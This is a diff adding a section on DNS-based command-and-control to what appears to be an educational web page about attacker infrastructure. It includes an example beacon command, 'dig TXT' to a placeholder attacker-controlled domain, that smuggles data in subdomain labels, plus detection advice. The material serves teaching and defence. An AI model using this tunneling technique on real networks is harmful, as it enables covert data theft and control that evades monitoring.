@@ -55,6 +55,28 @@ Beacon / implant    — the small agent running on the compromised host, checkin
 - What HTTP headers and User-Agent string it sends
 - How the actual C2 data gets encoded inside otherwise-normal-looking request/response bodies`}</CodeBlock>
 
+      <h2>DNS-based C2: a channel that doesn't even need outbound HTTP</h2>
+      <p>
+        Everything above assumes the beacon talks HTTP(S) out to a listener — the most common channel, and
+        the one most heavily monitored. DNS-based C2 encodes commands and results as subdomain labels inside
+        ordinary-looking DNS queries instead, which matters specifically on networks that block most outbound
+        traffic but still allow DNS resolution to function (nearly all of them, since breaking DNS breaks
+        everything):
+      </p>
+      <CodeBlock label="the shape of a DNS C2 beacon check-in">{`# the beacon encodes a small chunk of data into a subdomain label, then just resolves it —
+# a query the network's own DNS resolver forwards along like any other lookup:
+dig TXT 8f3e9a1b.beacon.attacker-controlled.com
+# the attacker's own authoritative nameserver for that domain receives the query, decodes
+# the label back into data, and encodes any response/command into the DNS answer it returns`}</CodeBlock>
+      <p>
+        The tradeoff that keeps this from being the default channel: DNS has a low practical throughput
+        (small query/response sizes, and each round-trip is slower than a normal HTTP request), so it's
+        reserved for environments with aggressive HTTP egress filtering rather than used as a general-purpose
+        C2 channel. Detecting it leans on the same instinct as beacon-timing analysis above, applied to DNS
+        query volume and entropy instead of HTTP request timing — a host suddenly resolving hundreds of
+        random-looking subdomains under one rarely-seen domain is a strong DNS-tunneling signal.
+      </p>
+
       <h2>Post-exploitation persistence: surviving a reboot</h2>
       <p>
         A beacon only exists in memory by default — reboot the host and it's gone. Persistence mechanisms
